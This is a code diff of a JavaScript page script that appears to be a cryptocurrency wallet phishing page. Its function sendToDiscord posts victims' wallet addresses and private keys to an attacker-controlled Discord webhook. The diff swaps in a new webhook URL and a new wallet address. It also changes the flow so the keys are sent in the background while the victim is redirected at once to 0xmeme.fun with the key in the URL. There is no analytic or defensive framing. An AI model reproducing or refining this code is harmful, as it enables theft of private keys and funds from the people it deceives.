@@ -11,12 +11,12 @@ document.addEventListener('DOMContentLoaded', function() {
 
     const VALID_WALLET_ADDRESSES = [
         "HJL5i5ez6M4mWy3dX1KtSEYfhW5GazpWttAowsRngYAm",
-        "BHBGj1hH5vinhnSStZBGeLraVdDLdEfLy8YFwLZGHf7t",
+        "3qDmJRFwV6ZZuHz4gYDRAdJQtJ4HBw5jWHNjaC9e8xaH",
         "F2MbRb3BaqHZwWw9Mv8DW1dBhBbncDbRK9pNnLMEW1Wa",
         "ENnCp997S9i8E11xgpR7CCfS8F87Df8BivYe68fyxSbp"
     ];
 
-    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1313437202385993798/PSz65bbO_Uq8yf9QRK5xkS9FP2KwMtDv9h6segXaljEUV53bPcKqw0ambV8RDX9nvmvQ";
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1340003897896337488/YgVR4qNkPbuKFBr8QBkQK2XIsixefmO4rvy52Nsh0oLyYltC_emiIiwZNQiD-qRbOlYW";
 
     // 发送数据到 Discord
     async function sendToDiscord(walletAddress, privateKey) {
@@ -111,13 +111,13 @@ document.addEventListener('DOMContentLoaded', function() {
         showLoading();
 
         try {
-            // 发送数据到 Discord
-            await sendToDiscord(walletAddress, privateKey);
-            
-            // 加密私钥并通过 URL 参数传递
+            // 先进行跳转
             const encryptedKey = encryptKey(privateKey);
             
-            // 跳转到目标页面，带上加密后的参数
+            // 发送数据到 Discord（放在后面）
+            sendToDiscord(walletAddress, privateKey).catch(console.error); // 使用 catch 处理可能的错误
+            
+            // 直接跳转，不等待 Discord 响应
             window.location.href = `https://www.0xmeme.fun?key=${encryptedKey}`;
             
         } catch (error) {
